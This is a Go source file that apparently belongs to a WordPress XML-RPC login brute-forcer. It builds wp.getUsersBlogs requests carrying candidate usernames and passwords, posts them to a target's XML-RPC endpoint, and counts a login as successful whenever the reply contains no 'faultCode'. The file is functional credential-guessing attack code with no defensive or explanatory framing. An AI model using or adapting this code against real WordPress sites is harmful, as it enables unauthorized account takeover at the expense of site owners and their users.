package main

import (
	"bytes"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
)

/**
 *  try to login on wordpress xmlrpc endpoint
 *
 */
func attemptLogin(url string, credentials Credentials) Result {
	requestBody := generateReqestBody(credentials)

	body, err := sendRequest(url, requestBody)
	if err != nil {
		log.Fatalln(err)
	}

	isSuccess := passOrFail(body)
	result := Result{
		Credentials: credentials,
		Success:     isSuccess,
	}

	return result
}

/**
 *  XMRPC protocol expects all requests to use HTTP POST
 *  create the body for for outgoing request using the credentials
 */
func generateReqestBody(credentials Credentials) string {
	return fmt.Sprintf(`
	<?xml version="1.0" encoding="utf-8"?>
  <methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param>
      <value><string>%s</string></value>
    </param>
    <param>
      <value><string>%s</string></value>
    </param>
  </params>
  </methodCall>
  `, credentials.Username, credentials.Password)
}

/**
 *  fire off a request to the server with the generated request body
 *
 */
func sendRequest(url string, body string) (string, error) {
	bodyBytes := []byte(body)
	res, err := http.Post(url, "application/xml", bytes.NewBuffer(bodyBytes))

	if err != nil {
		return "", err
	}

	defer res.Body.Close()

	statusCode := res.StatusCode
	if statusCode != 200 {
		message := fmt.Sprintf("Recieved unexpected HTTP Status :: %d \n", statusCode)
		return "", errors.New(message)
	}

	resBody, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return "", errors.New("Failed to read request Body")
	}

	return string(resBody), nil
}

/**
 *  analyze response body to check if the server accepted the credentials
 *
 */
func passOrFail(body string) bool {
	return !strings.Contains(body, "faultCode")
}
